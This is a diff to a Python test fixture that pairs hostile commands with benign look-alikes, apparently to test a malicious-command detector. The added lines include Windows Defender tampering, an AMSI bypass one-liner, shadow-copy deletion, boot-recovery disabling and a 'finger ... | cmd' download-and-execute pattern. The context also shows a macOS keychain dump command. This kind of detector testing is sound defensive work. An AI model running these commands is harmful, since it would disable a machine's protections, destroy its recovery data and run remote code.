@@ -606,6 +606,42 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
             b'osascript -e \'display dialog "Project name?" default answer ""\'\n',
         ),
         (
+            "win_defender_tamper",
+            b"Set-MpPreference -DisableRealtimeMonitoring $true\r\n",
+            b"Set-MpPreference -DisableRealtimeMonitoring $false\r\n",
+        ),
+        (
+            "win_defender_tamper",
+            b"Add-MpPreference -ExclusionPath $env:APPDATA\r\n",
+            b"Add-MpPreference -ExclusionPath C:\\src\\inert-repo\r\n",
+        ),
+        (
+            "win_defender_tamper",
+            b"sc.exe config WinDefend start= disabled\r\n",
+            b"sc.exe config WinDefend start= auto\r\n",
+        ),
+        (
+            "win_amsi_bypass",
+            b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
+            b".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\r\n",
+            b"AMSI passes script content to AmsiScanBuffer before it runs.\n",
+        ),
+        (
+            "win_recovery_inhibit",
+            b"vssadmin delete shadows /all /quiet\r\n",
+            b"vssadmin list shadows\r\n",
+        ),
+        (
+            "win_recovery_inhibit",
+            b"bcdedit /set {default} recoveryenabled No\r\n",
+            b"bcdedit /set {default} recoveryenabled Yes\r\n",
+        ),
+        (
+            "win_lolbin_download",
+            b"finger inert@example.invalid | cmd\r\n",
+            b"finger alice@example.invalid\r\n",
+        ),
+        (
             "macos_keychain_dump",
             b"security find-generic-password -ga Chrome\n",
             b"security find-generic-password -s Chrome\n",
